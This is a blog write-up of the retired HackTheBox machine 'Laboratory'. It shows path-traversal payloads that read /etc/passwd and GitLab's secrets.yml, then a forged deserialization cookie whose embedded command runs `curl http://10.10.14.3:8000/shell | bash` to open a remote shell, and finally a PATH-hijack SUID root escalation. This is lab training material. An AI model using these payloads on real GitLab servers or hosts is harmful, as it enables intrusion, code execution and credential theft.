@@ -1,0 +1,242 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HackTheBox - Laboratory Writeup · ElleuchX1</title><meta name="description" content="Here's my writeup for the RETIRED machine Laboratory, Which is an Easy Linux machine!"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="ElleuchX1" href="/rss.xml"><meta property="og:title" content="HackTheBox - Laboratory Writeup · ElleuchX1"><meta property="og:description" content="Here's my writeup for the RETIRED machine Laboratory, Which is an Easy Linux machine!"><meta property="og:type" content="article"><meta property="og:url" content="https://elleu.ch/posts/htb-Laboratory/"><meta property="og:image" content="https://elleu.ch/og/htb-Laboratory.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://elleu.ch/og/htb-Laboratory.png"><script>
+      (function () {
+        try {
+          var t = localStorage.getItem('theme');
+          if (!t) t = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+          document.documentElement.setAttribute('data-theme', t);
+        } catch (e) {}
+      })();
+      document.addEventListener('keydown', function (e) {
+        if (e.key !== '/' || e.metaKey || e.ctrlKey || e.altKey) return;
+        var t = e.target;
+        if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.isContentEditable)) return;
+        e.preventDefault();
+        window.location.href = '/search/';
+      });
+    </script><link rel="stylesheet" href="/_astro/_id_.mL4ELXTH.css"></head> <body> <a class="skip" href="#main">skip to content</a> <header class="site-header" data-pagefind-ignore> <div class="inner"> <a class="brand" href="/">elleuch<span class="at">:~$</span></a> <nav class="nav" aria-label="Main"> <a href="/posts/" aria-current="page">Posts</a><a href="/tags/">Tags</a><a href="/about/">About</a> <a class="search" href="/search/"><kbd>/</kbd></a> <button class="toggle" id="theme-toggle" type="button" aria-label="Toggle theme"> <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path> </svg> <svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"> <circle cx="12" cy="12" r="4"></circle> <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path> </svg> </button> <script>
+  document.getElementById('theme-toggle')?.addEventListener('click', () => {
+    const next = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', next);
+    try { localStorage.setItem('theme', next); } catch (e) {}
+  });
+</script> </nav> </div> </header> <main id="main">  <div class="progress" id="progress"></div> <div class="wrap"> <article class="article" data-pagefind-body> <a class="back" href="/posts/">← Posts</a> <header class="article-head"> <h1 data-pagefind-meta="title">HackTheBox - Laboratory Writeup</h1> <div class="article-meta"> <time datetime="2021-04-17T00:00:00.000Z">2021-04-17</time> <span>4 min read</span> </div> <div class="article-tags"> <a href="/tags/hackthebox/">#HackTheBox</a><a href="/tags/easy/">#easy</a><a href="/tags/linux/">#Linux</a> </div> </header> <details class="toc" open data-pagefind-ignore> <summary>contents</summary> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#web-enumeration">Web Enumeration</a></li> </ul> </details> <div class="prose">  <h1 id="information-gathering">Information Gathering</h1>
+<hr>
+<h2 id="nmap-scan">Nmap scan</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> nmap</span><span style="color:#79B8FF"> -sC</span><span style="color:#79B8FF"> -sV</span><span style="color:#79B8FF"> 10.10.10.216</span><span style="color:#79B8FF"> -v</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">PORT</span><span style="color:#9ECBFF">    STATE</span><span style="color:#9ECBFF"> SERVICE</span><span style="color:#9ECBFF">  VERSION</span></span>
+<span class="line"><span style="color:#B392F0">22/tcp</span><span style="color:#9ECBFF">  open</span><span style="color:#9ECBFF">  ssh</span><span style="color:#9ECBFF">      OpenSSH</span><span style="color:#9ECBFF"> 8.2p1</span><span style="color:#9ECBFF"> Ubuntu</span><span style="color:#9ECBFF"> 4ubuntu0.1</span><span style="color:#E1E4E8"> (Ubuntu </span><span style="color:#9ECBFF">Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">protocol</span><span style="color:#79B8FF"> 2.0</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> ssh-hostkey:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   3072</span><span style="color:#9ECBFF"> 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d</span><span style="color:#E1E4E8"> (RSA)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">   256</span><span style="color:#9ECBFF"> 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f</span><span style="color:#E1E4E8"> (ECDSA)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#79B8FF">  256</span><span style="color:#9ECBFF"> 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87</span><span style="color:#E1E4E8"> (ED25519)</span></span>
+<span class="line"><span style="color:#B392F0">80/tcp</span><span style="color:#9ECBFF">  open</span><span style="color:#9ECBFF">  http</span><span style="color:#9ECBFF">     Apache</span><span style="color:#9ECBFF"> httpd</span><span style="color:#79B8FF"> 2.4.41</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> http-methods:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#9ECBFF">  Supported</span><span style="color:#9ECBFF"> Methods:</span><span style="color:#9ECBFF"> GET</span><span style="color:#9ECBFF"> HEAD</span><span style="color:#9ECBFF"> POST</span><span style="color:#9ECBFF"> OPTIONS</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http-server-header:</span><span style="color:#9ECBFF"> Apache/2.4.41</span><span style="color:#E1E4E8"> (Ubuntu)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http-title:</span><span style="color:#9ECBFF"> Did</span><span style="color:#9ECBFF"> not</span><span style="color:#9ECBFF"> follow</span><span style="color:#9ECBFF"> redirect</span><span style="color:#9ECBFF"> to</span><span style="color:#9ECBFF"> https://laboratory.htb/</span></span>
+<span class="line"><span style="color:#B392F0">443/tcp</span><span style="color:#9ECBFF"> open</span><span style="color:#9ECBFF">  ssl/http</span><span style="color:#9ECBFF"> Apache</span><span style="color:#9ECBFF"> httpd</span><span style="color:#79B8FF"> 2.4.41</span><span style="color:#E1E4E8"> ((Ubuntu))</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> http-methods:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#9ECBFF">  Supported</span><span style="color:#9ECBFF"> Methods:</span><span style="color:#9ECBFF"> GET</span><span style="color:#9ECBFF"> POST</span><span style="color:#9ECBFF"> OPTIONS</span><span style="color:#9ECBFF"> HEAD</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http-server-header:</span><span style="color:#9ECBFF"> Apache/2.4.41</span><span style="color:#E1E4E8"> (Ubuntu)</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_http-title:</span><span style="color:#9ECBFF"> The</span><span style="color:#9ECBFF"> Laboratory</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> ssl-cert:</span><span style="color:#9ECBFF"> Subject:</span><span style="color:#9ECBFF"> commonName=laboratory.htb</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Subject</span><span style="color:#9ECBFF"> Alternative</span><span style="color:#9ECBFF"> Name:</span><span style="color:#9ECBFF"> DNS:git.laboratory.htb</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Issuer:</span><span style="color:#9ECBFF"> commonName=laboratory.htb</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Public</span><span style="color:#9ECBFF"> Key</span><span style="color:#9ECBFF"> type:</span><span style="color:#9ECBFF"> rsa</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Public</span><span style="color:#9ECBFF"> Key</span><span style="color:#9ECBFF"> bits:</span><span style="color:#79B8FF"> 4096</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Signature</span><span style="color:#9ECBFF"> Algorithm:</span><span style="color:#9ECBFF"> sha256WithRSAEncryption</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Not</span><span style="color:#9ECBFF"> valid</span><span style="color:#9ECBFF"> before:</span><span style="color:#9ECBFF"> 2020-07-05T10:39:28</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> Not</span><span style="color:#9ECBFF"> valid</span><span style="color:#9ECBFF"> after:</span><span style="color:#9ECBFF">  2024-03-03T10:39:28</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> MD5:</span><span style="color:#79B8FF">   2873</span><span style="color:#9ECBFF"> 91a5</span><span style="color:#79B8FF"> 5022</span><span style="color:#9ECBFF"> f323</span><span style="color:#9ECBFF"> 4b95</span><span style="color:#9ECBFF"> df98</span><span style="color:#9ECBFF"> b61a</span><span style="color:#9ECBFF"> eb6c</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_SHA-1:</span><span style="color:#79B8FF"> 0875</span><span style="color:#9ECBFF"> 3a7e</span><span style="color:#9ECBFF"> eef6</span><span style="color:#9ECBFF"> 8f50</span><span style="color:#79B8FF"> 0349</span><span style="color:#9ECBFF"> 510d</span><span style="color:#9ECBFF"> 9fbf</span><span style="color:#9ECBFF"> abc3</span><span style="color:#9ECBFF"> c70a</span><span style="color:#9ECBFF"> a1ca</span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0"> tls-alpn:</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#F97583">|</span><span style="color:#B392F0">_</span><span style="color:#9ECBFF">  http/1.1</span></span>
+<span class="line"><span style="color:#B392F0">Service</span><span style="color:#9ECBFF"> Info:</span><span style="color:#9ECBFF"> Host:</span><span style="color:#9ECBFF"> laboratory.htb</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">OS:</span><span style="color:#9ECBFF"> Linux</span><span style="color:#E1E4E8">; </span><span style="color:#B392F0">CPE:</span><span style="color:#9ECBFF"> cpe:/o:linux:linux_kernel</span></span></code></pre>
+<p>We have 3 ports open:</p>
+<ul>
+<li>ssh: 22 running OpenSSH 8.2p1</li>
+<li>http: 80 running Apache httpd 2.4.41</li>
+<li>https: 443 running Apache httpd 2.4.41</li>
+</ul>
+<p>2 Domains:</p>
+<ul>
+<li>laboratory.htb</li>
+<li>git.laboratory.htb</li>
+</ul>
+<hr>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<blockquote>
+<p>After adding laboratory.htb &#x26; git.laboratory.htb to /etc/hosts</p>
+</blockquote>
+<p>Let’s check laboratory.htb first</p>
+<img decoding="async" loading="lazy" alt="users" src="/assets/img/htb-Laboratory/users.webp">
+<p>We got 2 usernames:</p>
+<ul>
+<li>Dexter</li>
+<li>DeeDee Dee_Dee ..</li>
+</ul>
+<blockquote>
+<p>Skipping Gobuster scans, as it gave me nothing interesting</p>
+</blockquote>
+<p>Seems like it’s a static website, nothing much to see!</p>
+<p>Let’s move to git.laboratory.htb</p>
+<img decoding="async" loading="lazy" alt="gitlab" src="/assets/img/htb-Laboratory/gitlab.webp">
+<p>Tried few logins but it failed, ( dexter:admin dexter:password )</p>
+<p>Let’s create our own account and see what we can do</p>
+<img decoding="async" loading="lazy" alt="reg" src="/assets/img/htb-Laboratory/reg.webp">
+<p><code>GitLab Community Edition 12.8.1</code></p>
+<img decoding="async" loading="lazy" alt="git ver" src="/assets/img/htb-Laboratory/git_ver.webp">
+<hr>
+<h1 id="initial-foothold">Initial foothold</h1>
+<blockquote>
+<p>I think there are ready-to-use scripts to exploit this gitlab version, but we’ll do the process manually!</p>
+</blockquote>
+<p>Bascially we’re gonna abuse arbitrary file read via the UploadsRewriter when moving an issue, and get the <code>secret_key_base</code> from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml then generate the cookie payload via our own gitlab instance with the key that we got!</p>
+<blockquote>
+<p>If you wanna read more about this exploit: <a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></p>
+</blockquote>
+<p>Let’s now try to read /etc/passwd from the box</p>
+<ul>
+<li>Let’s first create 2 projects</li>
+</ul>
+<img decoding="async" loading="lazy" alt="pro" src="/assets/img/htb-Laboratory/pro.webp">
+<ul>
+<li>Let’s create an issue in one of these projets</li>
+</ul>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="passwd" src="/assets/img/htb-Laboratory/passwd.webp">
+<ul>
+<li>Let’s now move it to the other project</li>
+</ul>
+<img decoding="async" loading="lazy" alt="move" src="/assets/img/htb-Laboratory/move.webp">
+<img decoding="async" loading="lazy" alt="passwd1" src="/assets/img/htb-Laboratory/passwd1.webp">
+And we get the file!
+<img decoding="async" loading="lazy" alt="passwd2" src="/assets/img/htb-Laboratory/passwd2.webp">
+<p>Now let’s repeat the same thing to get /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="secret" src="/assets/img/htb-Laboratory/secret.webp">
+<p>Let’s now setup our gitlab env!</p>
+<blockquote>
+<p>You can either download the gitlab package or use docker</p>
+</blockquote>
+<p>For this, I am going to use docker! First let’s pull the image</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> docker</span><span style="color:#79B8FF"> -D</span><span style="color:#9ECBFF"> pull</span><span style="color:#9ECBFF"> gitlab/gitlab-ce:12.8.1-ce.0</span></span></code></pre>
+<p>then run it !</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> -it</span><span style="color:#9ECBFF"> gitlab/gitlab-ce:12.8.1-ce.0</span><span style="color:#9ECBFF"> sh</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="docker" src="/assets/img/htb-Laboratory/docker.webp">
+<blockquote>
+<p>PS: <code>id</code> command ; force of habit xD</p>
+</blockquote>
+<p>Let’s run</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gitlab-ctl</span><span style="color:#9ECBFF"> reconfigure</span></span></code></pre>
+<p>Let’s change the /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml file with the one that we got!
+Now, let’s run</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gitlab-ctl</span><span style="color:#9ECBFF"> restart</span></span>
+<span class="line"><span style="color:#B392F0">gitlab-rails</span><span style="color:#9ECBFF"> console</span></span></code></pre>
+<p>Here in the console, we’ll craft our cookie to gain access!</p>
+<p>Our payload to craft it:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#FFAB70">request</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> ActionDispatch</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Request</span><span style="color:#E1E4E8">.</span><span style="color:#F97583">new</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">Rails</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">application</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">env_config</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">request.</span><span style="color:#B392F0">env</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">"action_dispatch.cookies_serializer"</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> :marshal</span></span>
+<span class="line"><span style="color:#FFAB70">cookies</span><span style="color:#F97583"> =</span><span style="color:#E1E4E8"> request.</span><span style="color:#B392F0">cookie_jar</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FFAB70">erb</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> ERB</span><span style="color:#E1E4E8">.</span><span style="color:#F97583">new</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"&#x3C;%= `curl http://10.10.14.3:8000/shell | bash` %>"</span><span style="color:#E1E4E8">) </span></span>
+<span class="line"><span style="color:#FFAB70">depr</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> ActiveSupport</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Deprecation</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">DeprecatedInstanceVariableProxy</span><span style="color:#E1E4E8">.</span><span style="color:#F97583">new</span><span style="color:#E1E4E8">(erb, </span><span style="color:#79B8FF">:result</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"@result"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">ActiveSupport</span><span style="color:#E1E4E8">::</span><span style="color:#79B8FF">Deprecation</span><span style="color:#E1E4E8">.</span><span style="color:#F97583">new</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">cookies.</span><span style="color:#B392F0">signed</span><span style="color:#E1E4E8">[</span><span style="color:#79B8FF">:cookie</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> depr</span></span>
+<span class="line"><span style="color:#79B8FF">puts</span><span style="color:#E1E4E8"> cookies[</span><span style="color:#79B8FF">:cookie</span><span style="color:#E1E4E8">]</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="cookie" src="/assets/img/htb-Laboratory/cookie.webp">
+<p>Final payload:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#79B8FF"> -vvv</span><span style="color:#9ECBFF"> 'https://git.laboratory.htb/users/sign_in'</span><span style="color:#79B8FF"> -b</span><span style="color:#9ECBFF"> "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiaCNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBjdXJsIGh0dHA6Ly8xMC4xMC4xNC4zOjgwMDAvc2hlbGwgfCBzaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--a9181bfd8d26c33c9cf0c6fedcff269a3685902b"</span><span style="color:#79B8FF"> -k</span></span></code></pre>
+<p>Let’s set a listener, and grab that shell</p>
+<img decoding="async" loading="lazy" alt="foothold" src="/assets/img/htb-Laboratory/foothold.webp">
+<hr>
+<h1 id="user-privesc">User PrivEsc</h1>
+<p>So now we’re on a docker container as the <strong>git</strong> user!
+The trick now is to change the gitlab’s admin (who is id=1) password</p>
+<p>Going through gitlab’s docs to get the right syntax
+<a href="https://docs.gitlab.com/ee/security/reset_user_password.html">https://docs.gitlab.com/ee/security/reset_user_password.html</a></p>
+<p>It may take a while to run</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">gitlab-rails</span><span style="color:#9ECBFF"> console</span><span style="color:#79B8FF"> -e</span><span style="color:#9ECBFF"> production</span></span></code></pre>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#FFAB70">user</span><span style="color:#F97583"> =</span><span style="color:#79B8FF"> User</span><span style="color:#E1E4E8">.</span><span style="color:#B392F0">find</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">user.</span><span style="color:#B392F0">password</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> 'password123'</span></span>
+<span class="line"><span style="color:#E1E4E8">user.</span><span style="color:#B392F0">password_confirmation</span><span style="color:#F97583"> =</span><span style="color:#9ECBFF"> 'password123'</span></span>
+<span class="line"><span style="color:#E1E4E8">user.</span><span style="color:#B392F0">save!</span></span></code></pre>
+<img decoding="async" loading="lazy" alt="dexterpass" src="/assets/img/htb-Laboratory/dexterpass.webp">
+<p>Let’s login now with his account</p>
+<img decoding="async" loading="lazy" alt="projects" src="/assets/img/htb-Laboratory/projects.webp">
+<p>There is a private repo that contains his home directory backup!</p>
+<img decoding="async" loading="lazy" alt="ssh" src="/assets/img/htb-Laboratory/ssh.webp">
+<p>Let’s copy his ssh private key and get into the box!</p>
+<img decoding="async" loading="lazy" alt="user" src="/assets/img/htb-Laboratory/user.webp">
+<hr>
+<h1 id="root-privesc">Root PrivEsc</h1>
+<p>Let’s first run Linpeas!
+Going through the output, we can see that there is unusual suid binary
+<img decoding="async" loading="lazy" alt="suid" src="/assets/img/htb-Laboratory/suid.webp"></p>
+<p>let’s run Ltrace on this binary</p>
+<img decoding="async" loading="lazy" alt="ltrace" src="/assets/img/htb-Laboratory/ltrace.webp">
+<p>We can abuse this binary, by creating a fake malicious chmod binary</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "/bin/bash -p"</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> /tmp/chmod</span></span>
+<span class="line"><span style="color:#B392F0">chmod</span><span style="color:#79B8FF"> 777</span><span style="color:#9ECBFF"> /tmp/chmod</span></span>
+<span class="line"><span style="color:#F97583">export</span><span style="color:#E1E4E8"> PATH</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">/tmp:$PATH</span></span></code></pre>
+<p>Then we run the binary!</p>
+<img decoding="async" loading="lazy" alt="root" src="/assets/img/htb-Laboratory/root.webp">
+And we rooted the box!  </div> <nav class="pager" aria-label="Post navigation"> <a href="/posts/htb-passage/"><span class="lbl">← prev</span>HackTheBox - Passage Writeup</a> <a class="next" href="/posts/hacklock2021/"><span class="lbl">next →</span>Securinets HackLock 2021</a> </nav> </article> </div> <aside class="toc-rail" data-pagefind-ignore aria-label="Table of contents"> <div class="lbl">contents</div> <ul> <li class="d2"><a href="#nmap-scan">Nmap scan</a></li><li class="d2"><a href="#web-enumeration">Web Enumeration</a></li> </ul> </aside><button class="to-top" id="to-top" type="button" aria-label="Back to top">↑ top</button>  </main> <footer class="site-footer" data-pagefind-ignore> <div class="inner"> <span>© 2026 ElleuchX1</span> <span> <a href="https://github.com/ElleuchX1">github</a> ·
+<a href="https://twitter.com/ElleuchX1">x</a> ·
+<a href="/rss.xml">rss</a> ·
+<a href="mailto:contact@elleu.ch">mail</a> </span> </div> </footer> </body></html> <script>
+  (function () {
+    // reading progress + back-to-top
+    var bar = document.getElementById('progress');
+    var top = document.getElementById('to-top');
+    function update() {
+      var h = document.documentElement;
+      var max = h.scrollHeight - h.clientHeight;
+      var pct = max > 0 ? h.scrollTop / max : 0;
+      if (bar) bar.style.width = pct * 100 + '%';
+      if (top) top.classList.toggle('show', h.scrollTop > 600);
+    }
+    document.addEventListener('scroll', update, { passive: true });
+    if (top) top.addEventListener('click', function () { window.scrollTo({ top: 0, behavior: 'smooth' }); });
+    update();
+
+    // permalink anchors on headings
+    document.querySelectorAll('.prose h2[id], .prose h3[id]').forEach(function (h) {
+      var a = document.createElement('a');
+      a.className = 'anchor';
+      a.href = '#' + h.id;
+      a.setAttribute('aria-label', 'Link to this section');
+      a.textContent = '#';
+      h.appendChild(a);
+    });
+
+    // code blocks: language label + copy button
+    document.querySelectorAll('.prose pre.astro-code').forEach(function (pre) {
+      var wrap = document.createElement('div');
+      wrap.className = 'code';
+      pre.parentNode.insertBefore(wrap, pre);
+      var bar = document.createElement('div');
+      bar.className = 'code-bar';
+      var lang = pre.getAttribute('data-language') || 'text';
+      var span = document.createElement('span');
+      span.className = 'code-lang';
+      span.textContent = lang;
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'copy';
+      btn.textContent = 'copy';
+      btn.addEventListener('click', function () {
+        var text = pre.innerText;
+        var done = function () { btn.textContent = 'copied'; setTimeout(function () { btn.textContent = 'copy'; }, 1200); };
+        if (navigator.clipboard) { navigator.clipboard.writeText(text).then(done, done); }
+        else {
+          var ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {} ta.remove(); done();
+        }
+      });
+      bar.appendChild(span);
+      bar.appendChild(btn);
+      wrap.appendChild(bar);
+      wrap.appendChild(pre);
+    });
+  })();
+</script>
